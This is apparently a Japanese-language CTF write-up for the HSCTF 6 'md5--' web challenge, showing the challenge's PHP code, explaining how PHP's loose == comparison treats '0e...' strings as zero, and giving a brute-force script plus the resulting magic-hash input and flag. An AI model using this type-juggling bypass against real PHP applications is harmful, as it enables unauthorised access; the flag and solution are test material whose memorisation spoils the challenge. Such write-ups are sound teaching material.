# HSCTF 6 md5-- [Web 171pts]

## 問題

Written by: dwang

md5-- == md4

https://md5--.web.chal.hsctf.com

Note: If the link above doesn't work, try https://md4.web.chal.hsctf.com

## 解法

与えられたURLを開くとPHPのソースコードが表示される
```php
<?php
$flag = file_get_contents("/flag");

if (!isset($_GET["md4"]))
{
    highlight_file(__FILE__);
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo $flag;
}
else
{
    echo "bad";
}
?>
```

`?md4=hogehoge`のようにパラメータを設定し、その文字列をMD4でハッシュ化した値が元の文字列と一致していればフラグが表示される。
ただこの比較が == でなされているので、型のチェックが甘い。文字列内に数値形式の文字が含まれると数値に変換される。<sup>[1]</sup>
つまり
`hash("md4", "0exxxxxxx") == "0eyyyyyyyyyy"`
となるようなハッシュを見つけることができれば、どちらも0と評価され条件が成立する。<sup>[2]</sup>
CLI版で総当たりで調べると5分くらい？で出てきた。

```php

<?php

for($i = 100000000; $i <= 1000000000; $i++){
	if($i%1000000 == 0){
		echo "\r[+] i = ".strval($i);
	}
  	$s = "0e".strval($i);
  	$x = hash("md4", $s);
  	if(preg_match("#0e\d{30}#", $x)){
		echo "\n";
	    echo $s;
	    echo "\n";
	    echo $x;
		echo "\n";
	    break;
  	}
}
echo "\n";
?>
```
結果として、`0e251288019`は`0e874956163641961271069404332409`となり、これをパラメータとして送るとフラグが得られた。


Flag: `hsctf{php_type_juggling_is_fun}`


## 参考
[1] https://www.php.net/manual/ja/language.operators.comparison.php

[2] https://www.php.net/manual/ja/language.types.string.php#language.types.string.conversion
